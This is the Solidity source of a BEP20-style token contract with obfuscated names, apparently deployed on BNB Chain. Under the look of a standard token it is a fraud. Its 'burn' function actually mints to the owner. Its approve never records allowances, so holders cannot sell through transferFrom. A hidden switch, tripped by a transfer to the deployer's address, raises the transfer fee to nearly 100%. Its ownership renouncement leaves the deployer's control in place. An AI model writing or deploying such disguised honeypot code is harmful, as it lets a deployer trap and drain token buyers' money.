/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2021-10-11
 */
pragma solidity >=0.7.1;
contract EOtyGR {
string public  symbol = "AWSCWFW";
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
address public  qKhxia = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  WGUhrc = 100000000000000000000;
uint256 public  dczkRF = 100000000000000000000000;
uint256 public constant fjVBOs = 73999;
uint8 public constant decimals = 18;
address public  deJEVB = address(0);
uint256 public  mDZllv = 10000000000000000000000000000;
address public  riJmlf = address(0);
string public  name = "FDCJvz";
address private  OvbfGn = address(0);
uint256 private  OuwxlC = 10000000000000;
address public  NgBfHQ = address(0);
address public  RsEXZj = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  YNYhdx = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public  GMmZrl = 100000000000000000000000;
uint256 public  vVqAlh = 100000000000000000;
uint256 public  nVuQhj = 10000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  muOUjZ = 1000000000000000000;
address public constant burnasdwAAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public  kTYmqe = 10000000000000000000;
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");


emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "LlNHGg");
require(to != address(0), "LlNHGg");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* fjVBOs/OuwxlC ;
}
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==OvbfGn){
OuwxlC = 73999+1;
}
emit Transfer(from, to, transferAmount);
}
receive() external payable {}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
constructor () {
OvbfGn = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

}